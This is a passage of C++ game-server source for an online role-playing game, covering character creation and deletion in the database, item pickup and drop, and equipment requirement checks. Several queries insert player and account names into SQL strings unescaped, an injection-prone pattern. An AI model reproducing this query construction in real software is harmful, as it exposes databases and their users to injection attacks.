      bRollWIL += static_cast< DWORD >( 1.5 * nPnts );
      bRollLCK += static_cast< DWORD >( 3.5 * nPnts );
      
      if( lpbAnswers[ 5 ] == GENDER_FEMALE )
      {
         SetGender( GENDER_FEMALE );
         Appearance = __PLAYER_FEMALE_PUPPET;
      }
      else
      {
         SetGender( GENDER_MALE );
         Appearance = __PLAYER_PUPPET;
      }
   }

   // Do a first roll of the stats
   roll_stats();

   // Build the INSERT query
   csQuery.Format(	    
      "INSERT INTO PlayingCharacters("
      "UserID,"
      "PlayerName,"
      "AccountName,"
      "Strength,"
      "Endurance,"
      "Agility,"
      "Intelligence,"
      "Wisdom,"
      "Luck,"
      "AttackSkill,"
      "DodgeSkill,"
      "XP,"
      "CurrentLevel,"
      "CurrentHP,"
      "MaxHP,"
      "CurrentMana,"
      "MaxMana,"
      "Gold,"
      "wlX,"
      "wlY,"
      "wlWorld,"
      "SkillPnts,"
      "StatPnts,"
      "Corpse,"
      "Appearance,"
      "Karma,"
      "Gender,"
      "ListingTitle,"
      "ListingMisc,"
      "MoveExhaust,"
      "MentalExhaust,"
      "AttackExhaust,"
      "Crime,"
      "Honor"
      ")VALUES("
      "%u,"   //"UserID"
      "'%s'," //"PlayerName,"
      "'%s'," //"AccountName,"
      "%u,"   //"Strength,"
      "%u,"   //"Endurance,"
      "%u,"   //"Agility,"
      "%u,"   //"Intelligence,"
      "%u,"   //"Wisdom,"
      "%u,"   //"Luck,"
      "%u,"   //"AttackSkill,"
      "%u,"   //"DodgeSkill,"
      "%f,"   //"XP,"
      "%u,"   //"CurrentLevel,"
      "%u,"   //"CurrentHP,"
      "%u,"   //"MaxHP,"
      "%u,"   //"CurrentMana,"
      "%u,"   //"MaxMana,"
      "%u,"   //"Gold,"
      "%u,"   //"wlX,"
      "%u,"   //"wlY,"
      "%u,"   //"wlWorld,"
      "%u,"   //"SkillPnts,"
      "%u,"   //"StatPnts,"
      "%u,"   //"Corpse,"
      "%u,"   //"Appearance,"
      "%d,"   //"Karma,"
      "%u,"   //"Gender,"
      "'',"   //"ListingTitle,"
      "'',"   //"ListingMisc",
      "0,"    // MoveExhaust
      "0,"    // MentalExhaust
      "0,"    // AttackExhaust
      "%d,"   // Crime
      "%d)",  // Honor
      GetID(),
      (LPCTSTR)GetTrueName(),
      (LPCTSTR)szAccount,
      GetTrueSTR(),
      GetTrueEND(),
      GetTrueAGI(),
      GetTrueINT(),
      GetTrueWIS(),
      GetTrueLCK(),			
      GetTrueATTACK(),
      GetTrueDODGE(),
      (double)GetXP(),
      GetLevel(),
      GetHP(),
      GetTrueMaxHP(),
      GetMana(),
      GetTrueMaxMana(),
      GetGold(),
      GetWL().X,
      GetWL().Y,
      GetWL().world,
      wNbSkillPnts,
      wNbStatPnts,
      Corpse,
      Appearance,
      nKarma,
      bGender,
      (LPCTSTR)csListingTitle,
      (LPCTSTR)csListingMisc,
      GetCrime(),
      GetHonor()
      );

   // If INSERT query was successful
   BOOL bOK = FALSE;
   ODBCCharWrite.Lock();
   if(	ODBCCharWrite.SendRequest( (LPCTSTR)csQuery ) )
   {
      ODBCCharWrite.Commit();
      bOK = TRUE;
   }
   ODBCCharWrite.Cancel();
   ODBCCharWrite.Unlock();
   return bOK;
}
/******************************************************************************/
// flushes a character, deletes everything (files and cie)
char Character::DeleteCharacter(CString ch_name, CString ch_account, BOOL Report)
/******************************************************************************/
{
   CString csQuery;
   char lpszUserName[21];
   DWORD dwID = 0;

   ODBCCharWrite.Lock();
   csQuery.Format( "SELECT AccountName, UserID FROM PlayingCharacters WHERE PlayerName='%s'", (LPCTSTR)ch_name );
   ODBCCharWrite.SendRequest( (LPCTSTR)csQuery );

   // If user exists
   if( ODBCCharWrite.Fetch() )
   {
      // Get the username.
      ODBCCharWrite.GetString( 1, lpszUserName, 21 );
      ODBCCharWrite.GetDWORD ( 2, &dwID );

      // If player is owned by the calling account.
      if( _stricmp( lpszUserName, (LPCTSTR)ch_account ) == 0 )
      {
         _LOG_PC
            LOG_MISC_1,
            "Player %s (IP %s) deleted his character %s.",
            lpszUserName,
            (LPCTSTR)( reinterpret_cast< Players *>( ThisPlayer )->GetIP() ),
            (LPCTSTR)ch_name
            LOG_

         // Cancel previous fetch operation
         ODBCCharWrite.Cancel();

         // Are we deleting right off the bat or are we taking it from the account for later purging?
         // Ok, lets just remove it from account, allowing it to be restored later by an operator.

         SYSTEMTIME sysTime; 
         GetLocalTime(&sysTime);
         CString csTimeStamp;
         csTimeStamp.Format("$%04d%02d%02d%02d%02d%02d-%03d$",sysTime.wYear, sysTime.wMonth,sysTime.wDay,sysTime.wHour, sysTime.wMinute,sysTime.wSecond,rand()%1000);
         csQuery.Format( "UPDATE PlayingCharacters SET PlayerName='%s%s', AccountName='DeletedFrom:%s' WHERE PlayerName='%s'", (LPCTSTR)csTimeStamp, (LPCTSTR)ch_name, (LPCTSTR)ch_account, (LPCTSTR)ch_name  );

         // Send the deletion request
         if( ODBCCharWrite.SendRequest( (LPCTSTR)csQuery ) )
         {
            ODBCCharWrite.Commit();
            ODBCCharWrite.Cancel();
            ODBCCharWrite.Unlock();
            return 0;
         }
         else
         {
            ODBCCharWrite.Cancel();
            ODBCCharWrite.Unlock();
            return 3;
         }
      }
      else
      {
         ODBCCharWrite.Cancel();
         ODBCCharWrite.Unlock();
         return 2; // Not your player!
      }	
   }
   ODBCCharWrite.Cancel();
   ODBCCharWrite.Unlock();

   return 1;
}
/******************************************************************************/
// Get's an object from the ground, doesn't check if it can (a prior call to "can_get" must be done)
void Character::GetUnit(WorldPos originalPos, Unit *tobj, bool bUpdateBackpack) // The object fetched from the ground.
/******************************************************************************/
{   
   Disturbed(DISTURB_CLOSECHEST|DISTURB_CLOSETRADE|DISTURB_UNHIDE);

   if( tobj->GetType() != U_OBJECT )
   {
      return;
   }

   Objects *obj = static_cast< Objects * >( tobj );
   Players *lpPlayer = static_cast< Players * >( GetPlayer() );//BLBLBL on choppe un handle sur le joueur qui tente de ramasser

   // Remove the hidden flag.
   obj->RemoveFlag( __FLAG_HIDDEN );

   // if the object is withing getting range					
   DWORD dwReason = OBJECT_DISTURB_GET;

   bool add = true;

   obj->SendUnitMessage(MSG_OnDisturbed, obj, NULL, this, &dwReason );
   if( obj->GetMark() & MARK_DELETION )
   {
      // If the object is new empty.
      obj->Remove();
      if( obj->GetQty() == 0 )
      {
         // Delete and don't add it to the backpack.
         obj->DeleteUnit();
         add = false;
      }
   }

   // The item got deleted while being get
   if( !add )
   {
      return;
   }
   // If this is a gold stack.
   if( obj->GetStaticReference() == (UINT)__OBJ_GOLD )
   {
      // Add the gold directly to player.
      SetGold( GetGold() + obj->GetQty() );

      return;
   }

   _item *lpItem = NULL;

   obj->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItem );

   if( lpItem == NULL )
   {
      return;
   }

   // Determine how many of this item can be carried by the user.
   DWORD maxQty;
   if( lpItem->size == 0 || ( lpPlayer->GetGodFlags() & GOD_CAN_SUMMON_ITEMS )){//BLBLBL GM can always pick up an item
      maxQty = 0xFFFFFFFF;
   }
   else
   {
      maxQty = ( GetMaxWeight() - GetWeight() ) / lpItem->size;
   }

   // Impossible
   if( maxQty == 0 )
   {
      ASSERT( 0 );
      return;
   }

   // If the item has more items than the user can carry.
   if( obj->GetQty() > maxQty )
   {
      // Determine how many need to stay on the ground.
      DWORD qty = obj->GetQty() - maxQty;

      // Create a new object of this type.
      Objects *newObj = new Objects;
      if( newObj->Create( U_OBJECT, obj->GetStaticReference() ) )
      {
         // Set its quantity to the remainder.
         newObj->SetQty( qty );

         // Deposit the new unit where it was gotten.
         WorldMap *wl = TFCMAIN::GetWorld( originalPos.world );

         wl->deposit_unit( originalPos, newObj );

         newObj->BroadcastPopup( originalPos );


         // Set the backpack object's quantity to the max possible quantity.
         obj->SetQty( maxQty );
      }
      else
      {
         newObj->DeleteUnit();
      }
   }

   AddToBackpack( obj );

   if(bUpdateBackpack)
   {
	   // Shoot a backpack update.
	   TFCPacket sending;
	   sending << (RQ_SIZE)RQ_ViewBackpack2;
	   sending << (char)0;	// Do not show content of backpack, only update it.
	   sending << (long)GetID();
	   PacketBackpack(sending);
	   SendPlayerMessage( sending );
   }
   
   /*
   sending.Destroy();
   packet_equiped( sending );
   SendPlayerMessage( sending );
   */
}
/******************************************************************************/
// Verifies that an object can be get.
BOOL Character::can_get(WorldPos where, Objects *obj)
/******************************************************************************/
{	
   ASSERT( obj->GetType() == U_OBJECT );
   // You can only get items! Nothing else!
   if( obj->GetType() != U_OBJECT )
   {
      _LOG_DEBUG
         LOG_WARNING,
         "Player %s tried to get a non-item named %s.",
         GetTrueName(),
         obj->GetName( _DEFAULT_LNG )
         LOG_
         return false;
   }

   _item *lpItem = NULL;
   Players *lpPlayer = static_cast< Players * >( GetPlayer() );//BLBLBL on choppe un handle sur le joueur qui tente de ramasser

   obj->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItem );

   if( lpItem != NULL )
   {
      //BLBLBL a GM can pick up anything anywhere on screen
      if ( lpPlayer->GetGodFlags() & GOD_CAN_SUMMON_ITEMS )
      {
         if( lpItem->dwDropFlags & CANNOT_GET_ITEM ) 
         {
            return FALSE;//Except non-get items (decors)
         }
         else
         {
            return TRUE;
         }
      }

      // If the quantity of weight left on player can hold at least
      // one of these items.
      if( ( GetMaxWeight() - GetWeight() ) >= lpItem->size )
      {
         int nTouchRange = ViewFlag( __FLAG_ARM_EXTENT );
         if( nTouchRange == 0 )
         {
            nTouchRange = _DEFAULT_TOUCH_RANGE;
         }

         // If object is not within range.
         if(!(abs(where.X - GetWL().X) < _DEFAULT_TOUCH_RANGE && abs(where.Y - GetWL().Y) < _DEFAULT_TOUCH_RANGE))
         {
            return FALSE;
         }
         TRACE( "\n Drop flags=%u.", lpItem->dwDropFlags );

         // If object can be get.
         if( lpItem->dwDropFlags & CANNOT_GET_ITEM ) 
         {
            return FALSE;	        
         }	        
         return TRUE;
      }
      else
      {
         TELL_PLAYER( 17 );
      }
   }
   return FALSE;
}
/******************************************************************************/
//  Drops a unit from the backpack to the ground.
Unit * Character::DropUnit(
                           WorldPos where, // Where to drop the unit
                           DWORD itemId,   // The ID of the item to drop.
                           DWORD qty       // The quantity of items from a stack to drop.
                           )
                           /******************************************************************************/
{
   Disturbed();

   BOOL done = FALSE;
   BOOL endsearch = FALSE;	
   DWORD dwReason = OBJECT_DISTURB_DROP;

   int nThrowRange = ViewFlag( __FLAG_ARM_EXTENT );

   if( nThrowRange == 0 )
   {
      nThrowRange = 10;
   }

   // If it cannot be thrown/dropped
   if( !( abs(where.X - GetWL().X) < nThrowRange && abs(where.Y - GetWL().Y) < nThrowRange ) )
   {
      return NULL;
   }

   // Get the world
   WorldMap *wl = TFCMAIN::GetWorld( GetWL().world );
   if( wl == NULL )
   {
      return NULL;
   }

   DWORD qtySave = qty;

   backpack->Lock();
   backpack->ToHead();
   while( backpack->QueryNext() )
   {
      qty = qtySave;

      Objects *obj = static_cast< Objects * >( backpack->Object() );

      if( obj->GetID() != itemId )
      {
         continue;
      }

      // If user does not have any gold and wants to drop a gold stack.
      if( obj->GetStaticReference() == (UINT)__OBJ_GOLD && GetGold() == 0 )
      {
         continue;
      }

      // If the quantity is bigger than the total quantity.
      if( obj->GetQty() < qty )
      {
         // Adjust it.
         qty = obj->GetQty();
      }

      _item *lpItem = NULL;

      obj->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItem );

      if( lpItem == NULL )
      {
         continue;
      }
      // Can it be dropped? :)
      if( lpItem->dwDropFlags & CANNOT_DROP_ITEM )
      {
         // This object cannot be dropped.
         SendSystemMessage( _STR( 7694, GetLang() ) );
         continue;
      }
      // we flush it from the backpack
      obj->SendUnitMessage(MSG_OnDisturbed, obj, NULL, this, &dwReason );
      if( obj->GetMark() & MARK_DELETION )
      {						
         obj->Remove( qty );
         if( obj->GetQty() == 0 )
         {
            backpack->Object()->DeleteUnit();
            backpack->Remove();
         }
         backpack->Unlock();
         return NULL;						
      }

      // If the player dropped at the player's spot.
      if( where.X == GetWL().X && where.Y == GetWL().Y )
      {
         // Find a new valid spot, around the player.
         WorldPos newPos = wl->FindValidSpot( where, 3, true );//BLBLBL on cherche à poser le plus près possible du perso

         // If the given spot is valid.
         if( newPos.X != -1 && newPos.Y != -1 )
         {                                
            // Use it.
            where = newPos;
         }
      }

      if( !wl->IsValidPosition( where ) || wl->IsBlocking(where) )
      {
         SendSystemMessage( _STR( 468, GetLang() ) );
         continue;
      }

      WorldPos wlCollidePos;
      Unit *lpDummy;
      wl->GetCollisionPos( GetWL(), where, &wlCollidePos, &lpDummy );

      // If the collision pos does not corresponds to the desired spot.
      if( wlCollidePos.X != where.X || wlCollidePos.Y != where.Y )
      {
         SendSystemMessage( _STR( 468, GetLang() ) );
      }

      bool forceQtyToOne = false;
      Objects *droppedObj;
      // If there are more than 1 item in the backpack
      if( obj->GetQty() > 1 )
      {
         // Create a copy of the backpack item
         droppedObj = new Objects();
         if( !droppedObj->Create( U_OBJECT, obj->GetStaticReference() ) )
         {
            droppedObj->DeleteUnit();
            continue;
         }
         // Set the quantity of items to the quantity of dropped items.
         droppedObj->SetQty( qty );
      }
      else
      {
         // Used the backpack item as the dropped item.
         droppedObj = obj;
         // Add 1 qty count to avoid deleting the unit.
         forceQtyToOne = true;

         backpack->Remove();
      }

      char lpszID[ 256 ];
      Unit::GetNameFromID( droppedObj->GetStaticReference(), lpszID, U_OBJECT );

      _LOG_ITEMS
         LOG_MISC_1,
         "Player %s (%s) dropped %u item %s ID( %s ) at ( %u, %u, %u )",
         GetTrueName(),
         GetPlayer()->GetFullAccountName(),
         qty,
         droppedObj->GetName( _DEFAULT_LNG ),
         lpszID,
      where.X,
      where.Y,
      where.world
      LOG_

         wl->deposit_unit( where, droppedObj );
      droppedObj->BroadcastPopup( where );//BLBLBL

      bool updateGold = false;
      DWORD goldUpdate = 0;
      // If this is a gold stack.
      if( obj->GetStaticReference() == (UINT)__OBJ_GOLD )
      {
         // Gets its gold value.
         if( qty < GetGold() )
         {
            // Remove gold directly from player.
            goldUpdate = GetGold() - qty;
         }
         updateGold = true;
      }

      // Remove the quantity of objects dropped from the backpack item.
      if( forceQtyToOne )
      {
         obj->SetQty( 1 );
      }
      else
      {
         obj->Remove( qty );
      }

      if( obj->GetQty() == 0 )
      {
         backpack->Remove();
         obj->DeleteUnit();
      }

      // Shoot a backpack update.
      TFCPacket sending;

      sending << (RQ_SIZE)RQ_ViewBackpack2;
      sending << (char)0;	// Do not show content of backpack, only update it.
      sending << (long)GetID();
      PacketBackpack(sending);

      SendPlayerMessage( sending );					
      backpack->Unlock();

      if( updateGold )
      {
         // Reset the gold amount (after the backpack was released).
         SetGold( goldUpdate );
      }
      return droppedObj;
   }
   backpack->Unlock();

   return NULL;
}
/******************************************************************************/
// Creates an object into a user's backpack, should be a god-only function
unsigned long Character::god_create_object(unsigned short which_item)
/******************************************************************************/
{	
   Objects *new_item = new Objects;
   new_item->Create(U_OBJECT, which_item);
   backpack->Lock();
   backpack->AddToTail(new_item);
   backpack->Unlock();

   return new_item->GetID();	
}
/******************************************************************************/
// Determines if an item can be equipped.
BOOL Character::CanEquip(
                         Unit *lpuEquip,    // Item
                         _item *lpItem,      // Item structure, used if provided.
                         BOOL boEcho,
                         CString *reqText   // Text to put the reqs in, if any.
                         )
                         /******************************************************************************/
{
   BOOL boReturn = TRUE;
   if( lpuEquip->GetType() == U_OBJECT || lpItem != NULL )
   {
      // If an item structure wasn't provided
      if( lpItem == NULL )
      {
         // Fetch item structure.
         lpuEquip->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItem );
      }

      TFormat format;

      bool prev = false;
      if( reqText != NULL )
      {
         *reqText = _STR( 7277, GetLang() );
      }

      if( reqText != NULL )
      {
         if( lpItem->armor.End != 0 )
         {
            *reqText += format( _STR( 7280, GetLang() ), lpItem->armor.End );
            prev = true;
         }
      }

      TRACE( "\r\nThis armor's endurance=%u", lpItem->armor.End );
      // If player doesn't have the required endurance.
      if( !( GetTrueEND() >= lpItem->armor.End ) )
      {
         if( boEcho )
         {
            TELL_PLAYER( 8 );
         }
         boReturn = FALSE;
      }

      if( reqText != NULL )
      {
         if( lpItem->weapon.Str != 0 )
         {
            *reqText += format( _STR( 7279, GetLang() ), lpItem->weapon.Str );
            prev = true;
         }
      }

      // If player doesn't have the required strength.
      if( !( GetTrueSTR() >= lpItem->weapon.Str ) )
      {
         if( boEcho )
         {
            TELL_PLAYER( 1 );
         }
         boReturn = FALSE;
      }

      if( reqText != NULL ){
         if( lpItem->weapon.Att != 0 )
         {
            *reqText += format( _STR( 11406, GetLang() ), lpItem->weapon.Att );
         }
      }
      if( !( GetTrueATTACK() >= lpItem->weapon.Att ) )
      {
         if( boEcho )
         {
            TELL_PLAYER( 11405 );
         }
         boReturn = FALSE;
      }

      TRACE( "\r\nboReturn = %u, Item MinInt=%u MinWis=%u, Player Int=%u Wis=%u.",
         boReturn,
         lpItem->magic.nMinInt,
         lpItem->magic.nMinWis,
         GetTrueINT(),
         GetTrueWIS()
         );

      if( reqText != NULL )
      {
         if( lpItem->magic.nMinInt != 0 )
         {
            if( prev )
            {
               *reqText += ", ";
            }

            *reqText += format( _STR( 7282, GetLang() ), lpItem->magic.nMinInt );
            prev = true;
         }
         if( lpItem->magic.nMinWis != 0 )
         {
            if( prev )
            {
               *reqText += ", ";
            }

            *reqText += format( _STR( 7283, GetLang() ), lpItem->magic.nMinWis );
            prev = true;
         }
         if( lpItem->weapon.Agi != 0 )
         {
            if( prev )
            {
               *reqText += ", ";
            }

            *reqText += format( _STR( 7281, GetLang() ), lpItem->weapon.Agi );
            prev = true;
         }

         if( prev )
         {
            *reqText += ".";
         }else{
            *reqText += _STR( 7286, GetLang() );
         }
      }

      // If player doesn't have enough int/wis to equip the object.
      if( lpItem->magic.nMinInt > GetTrueINT() )
      {
         if( boEcho )
         {
            TELL_PLAYER( 15 );
         }
         boReturn = FALSE;
      }
      if( lpItem->magic.nMinWis > GetTrueWIS() )
      {
         if( boEcho )
         {
            TELL_PLAYER( 21 );
         }
         boReturn = FALSE;
      }
      if( !( GetTrueAGI() >= lpItem->weapon.Agi ) )
      {
         if( boEcho )
         {
            TELL_PLAYER( 7847 );
         }
         boReturn = FALSE;
      }
   }
   return boReturn;
}
/******************************************************************************/
// Queries the stat reduction/requirements when equipping an item
BOOL Character::QueryEquip(
                           Unit *lpuEquip,	// The item equipped.
                           BYTE bItemType,	// The equip position where this object should be.
                           BYTE bEquipPos,	// the equip pos.
                           _item *item		// the 'item' structure of the item.
                           )
                           /******************************************************************************/
{
   BOOL boReturn = TRUE;

   // if item is a weapon. ( 1 = WEAPON1, 2 = WEAPON2 )
   if( bItemType == 1 || bItemType == 2 )
   {
      WORD wStr = GetSTR();
      WORD wAgi = GetAGI();
      int nDamBonus = 0;
      int nAttSkillBonus = 0;

      // If user has more then enough strength. 
      if( CanEquip( lpuEquip, item ) )
      {
         nDamBonus = 0;//( wStr - item->weapon.Str ) / 5;			

         // If player has an overall damage bonus
         if( nDamBonus != 0 )
         {
            if( bItemType == 1 )
            {
               SetBoost( BOOST_EQUIP_WEAPON1_DAM, STAT_DAMAGE, nDamBonus );
            }
            else
            {
               SetBoost( BOOST_EQUIP_WEAPON2_DAM, STAT_DAMAGE, nDamBonus );
            }
         }
         else
         {
            if( bItemType == 1 )
            {// Otherwise remove the unnecessary boost
               RemoveBoost( BOOST_EQUIP_WEAPON1_DAM );
            }
            else
            {
               RemoveBoost( BOOST_EQUIP_WEAPON2_DAM );
            }
         }
      }
      else
      {                
         return FALSE;
      }
   }
   else
      // if item is an armor	
      if( bItemType == 3 )
      {
         // User must have enough endurance.
         if( CanEquip( lpuEquip, item ) )
         {
            int nDodgeBoost = 0;

            // Remove the dodge skill malus.
            nDodgeBoost -= item->armor.Dod;

            if( nDodgeBoost != 0 )
            {
               switch( bEquipPos )
               {
               case body:		SetBoost( BOOST_EQUIP_ARMOR_BODY_DODGE, STAT_DODGE, nDodgeBoost ) ;		break;
               case feet:		SetBoost( BOOST_EQUIP_ARMOR_FEET_DODGE, STAT_DODGE, nDodgeBoost ) ;		break;
               case gloves:	SetBoost( BOOST_EQUIP_ARMOR_GLOVES_DODGE, STAT_DODGE, nDodgeBoost );	break;
               case helm:		SetBoost( BOOST_EQUIP_ARMOR_HELM_DODGE, STAT_DODGE, nDodgeBoost ) ;		break;
               case legs:		SetBoost( BOOST_EQUIP_ARMOR_LEGS_DODGE, STAT_DODGE, nDodgeBoost ) ;		break;
               case cape:	    SetBoost( BOOST_EQUIP_ARMOR_SLEEVES_DODGE, STAT_DODGE, nDodgeBoost );	break;
               }
            }
            else
            {
               switch( bEquipPos )
               {
               case body:		RemoveBoost( BOOST_EQUIP_ARMOR_BODY_DODGE ) ;	break;
               case feet:		RemoveBoost( BOOST_EQUIP_ARMOR_FEET_DODGE ) ;	break;
               case gloves:	RemoveBoost( BOOST_EQUIP_ARMOR_GLOVES_DODGE );	break;
               case helm:		RemoveBoost( BOOST_EQUIP_ARMOR_HELM_DODGE ) ;	break;
               case legs:		RemoveBoost( BOOST_EQUIP_ARMOR_LEGS_DODGE ) ;	break;
               case cape:	    RemoveBoost( BOOST_EQUIP_ARMOR_SLEEVES_DODGE ) ;break;
               }
            }
         }else{
            boReturn = FALSE;
         }
      }

      return boReturn;
}
/******************************************************************************/
// Equips an object (from backpack to proper worn position)
// Only equipped items are treated for magical abilities
char Character::equip_object(unsigned long item_number, bool gameop)
/******************************************************************************/
{ 

   if( gameopContext != NULL && !gameop )
   {
      gameopContext->equip_object( item_number, true );

      TFCPacket sendingE;
      gameopContext->packet_equiped( sendingE,true );
      SendPlayerMessage( sendingE );

      TFCPacket sendingBP;
      sendingBP << (RQ_SIZE)RQ_ViewBackpack2;
      sendingBP << (char)0;
      sendingBP << (long)GetID();
      gameopContext->PacketBackpack(sendingBP, true);
      SendPlayerMessage( sendingBP );
      return 0;
   }

   Disturbed();
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return 0;
   }
   /// *****E_NMS_DEATH 
	 CAutoLock(this);
   if( item_number )
   {
      BOOL boFound = FALSE;		
      unsigned long nb = 0;
      int ipos;

      Objects *equippedItem = NULL;

      backpack->Lock();
      backpack->ToHead();
      while( backpack->QueryNext() && !boFound)
      {
         Objects *obj = static_cast< Objects * >( backpack->Object() );
         if( obj->GetID() == item_number )
         {
            _item *itemStructure = NULL;

            // Get the item structure.
            obj->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &itemStructure );

            if( itemStructure == NULL )
            {
               continue;
            }

            // If this is a quiver.
            if( itemStructure->itemStructureId == 12 )
            {
               // Equip the WHOLE quiver (which full quantity).
               equippedItem = obj;
               backpack->Remove();
            }
            else
            {
               // Remove the item from the backpack if its stack is not empty.
               obj->Remove();
               if( obj->GetQty() == 0 )
               {
                  backpack->Remove();

                  // If the item is now empty, use it as the equipped object
                  // Avoids having to make a copy of it and allows 
                  // unique items to be added.
                  obj->SetQty( 1 );
                  equippedItem = obj;
               }
               else
               {
                  // Make a copy of this item type.
                  equippedItem = new Objects;

                  // If creating a copy failed.
                  if( !equippedItem->Create( U_OBJECT, obj->GetStaticReference() ) )
                  {
                     equippedItem->DeleteUnit();
                     equippedItem = NULL;
                  }
               }
            }
            boFound = TRUE;				
         }
      }

      // If the item was in the backpack
      if( boFound && equippedItem != NULL )
      {
         // Set to true if the item should be re-added to the backpack.
         bool addToBackpack = false;

         // Check to see if an item of the same type is already equipped.
         int z;
         bool boSame = false;
         for( z = 0; z < EQUIP_POSITIONS; z++ )
         {
            if( equipped[ z ] != NULL )
            {
               if( equipped[ z ]->GetStaticReference() == equippedItem->GetStaticReference() )
               {
                  boSame = true;
               }
            }
         }

         // If the item can be equipped.
         if( !boSame )
         {
            BOOL boEquip = TRUE;
            _item *lpItemStructure = NULL;

            // Get the item structure.
            equippedItem->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &lpItemStructure );

            if( lpItemStructure )
            {
               ipos = lpItemStructure->equip_position;
               TRACE("\r\nipos=%u\r\n", ipos);
               if(ipos >= 0 && ipos < EQUIP_POSITIONS) // avoids access violation
               {
                  DWORD dwCallReason = OBJECT_DISTURB_EQUIP;

                  // If this is a bow.
                  if( lpItemStructure->weapon.ranged && lpItemStructure->itemStructureId != 12  && (ipos == BOW_POS || ipos == QUIVER_POS)) //NMNMNM_EEEEEEEEEEE
                  {
                     // Verify that the equipped unit is a quiver.
                     if( equipped[ QUIVER_POS ] )
                     {
                        _item *is = NULL;
                        // Get the item structure.
                        equipped[ QUIVER_POS ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &is );

                        // If this is not a quiver.
                        if( is == NULL || is->itemStructureId != 12 )
                        {
                           TELL_PLAYER( 7883 );
                           boEquip = FALSE;
                        }
                     }
                  }
                  else if( ipos == BOW_POS )
                  {
                     // Verify that the equipped unit is NOT a quiver.
                     if( equipped[ QUIVER_POS ] )
                     {
                        _item *is = NULL;
                        // Get the item structure.
                        equipped[ QUIVER_POS ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &is );

                        // If this is a quiver.
                        if( is == NULL || is->itemStructureId == 12 )
                        {
                           TELL_PLAYER( 7885 );
                           boEquip = FALSE;
                        }
                     }
                  }
                  // If this is a quiver.
                  if( lpItemStructure->itemStructureId == 12 )
                  {
                     // Verify that the equipped unit is a bow.
                     if( equipped[ BOW_POS ] )
                     {
                        _item *is = NULL;
                        // Get the item structure.
                        equipped[ BOW_POS ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &is );

                        // If this is not a bow.
                        if( is == NULL || !is->weapon.ranged )
                        {
                           TELL_PLAYER( 7884 );
                           boEquip = FALSE;
                        }
                     }
                  }
                  else if( ipos == QUIVER_POS )
                  {
                     // Verify that the equipped unit is NOT a bow.
                     if( equipped[ BOW_POS ] )
                     {
                        _item *is = NULL;
                        // Get the item structure.
                        equipped[ BOW_POS ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &is );

                        // If this is a bow
                        if( is == NULL || is->weapon.ranged )
                        {
                           TELL_PLAYER( 7886 );
                           boEquip = FALSE;
                        }
                     }
                  }

                  if( boEquip )
                  {
                     switch(ipos)
                     {
                     case two_hands: // If it's a two handed weapon, it's special
                        if(!equipped[weapon_left] && !equipped[weapon_right])
                        {
                           // If user can equip this item
                           if( QueryEquip( equippedItem, 1, ipos, lpItemStructure ) )
                           {

                              equipped[weapon_right] = equippedItem; // Both hands point to the same object
                              equipped[weapon_left] = equippedItem; // only one hand will be processed!!
                              equippedItem->SendUnitMessage(MSG_OnDisturbed, equippedItem, NULL, this, &dwCallReason );

                              if( equippedItem->GetMark() & MARK_DELETION )
                              {
                                 equippedItem->DeleteUnit();
                                 equipped[ weapon_right ] = equipped[ weapon_left ] = NULL;
                                 boEquip = FALSE;
                              }
                           }
                           else
                           {
                              boEquip = FALSE;
                           }
                        }
                        else
                        {
                           TELL_PLAYER( 9 );
                           boEquip = FALSE;
                        }
                        break;
                     case rings:
                        // Checks both ring spaces for free
                        if(!equipped[ring1])
                        {
                           if( CanEquip( equippedItem, lpItemStructure ) ) 
                           {
                              equipped[ring1] = equippedItem;
                              equippedItem->SendUnitMessage(MSG_OnDisturbed, equippedItem, NULL, this, &dwCallReason );
                              if( equippedItem->GetMark() & MARK_DELETION )
                              {
                                 equippedItem->DeleteUnit();
                                 equipped[ ring1 ] = NULL;
                                 boEquip = FALSE;
                              }
                           }
                           else
                           {
                              boEquip = FALSE;
                           }
                        }
                        else if(!equipped[ring2])
                        {
                           if( CanEquip( equippedItem, lpItemStructure ) )
                           {
                              equipped[ring2] = equippedItem;					
                              equippedItem->SendUnitMessage(MSG_OnDisturbed, equippedItem, NULL, this, &dwCallReason );
                              if( equippedItem->GetMark() & MARK_DELETION )
                              {
                                 equippedItem->DeleteUnit();
                                 equipped[ ring2 ] = NULL;
                                 boEquip = FALSE;
                              }
                           }
                           else
                           {
                              boEquip = FALSE;
                           }
                        }
                        else
                        {
                           TELL_PLAYER( 10 );
                           boEquip = FALSE;
                        }
                        break;
                     case weapon: // case weapon actually means "any of the two hands"
                        if(!equipped[weapon_right])
                        {
                           // If user can equip this item
                           if( QueryEquip( equippedItem, 1, ipos, lpItemStructure ) )
                           {

                              equipped[weapon_right] = equippedItem;
                              equippedItem->SendUnitMessage(MSG_OnDisturbed, equippedItem, NULL, this, &dwCallReason );
                              if( equippedItem->GetMark() & MARK_DELETION )
                              {
                                 equippedItem->DeleteUnit();
                                 equipped[ weapon_right ] = NULL;
                                 boEquip = FALSE;
                              }
                           }
                           else
                           {
                              boEquip = FALSE;
                           }							
                        }
                        else if(!equipped[weapon_left])
                        { // otherwise check left
                           // Tell player he cannot wield two weapons at same time.
                           TELL_PLAYER( 11 );
                           boEquip = FALSE;	
                        }
                        else
                        {
                           // Otherwise re-add the object in the backpack
                           TELL_PLAYER( 12 );								
                           boEquip = FALSE;
                        }
                        break;
                        // If its an armor piece.
                     case body:
                     case feet:
                     case gloves:
                     case helm:
                     case legs:
                     case belt:
                        if(!equipped[ipos])
                        {
                           // If user can equip this item
                           if( QueryEquip( equippedItem, 3, ipos, lpItemStructure ) )
                           {

                              equipped[ipos] = equippedItem;
                              equippedItem->SendUnitMessage(MSG_OnDisturbed, equippedItem, NULL, this, &dwCallReason );
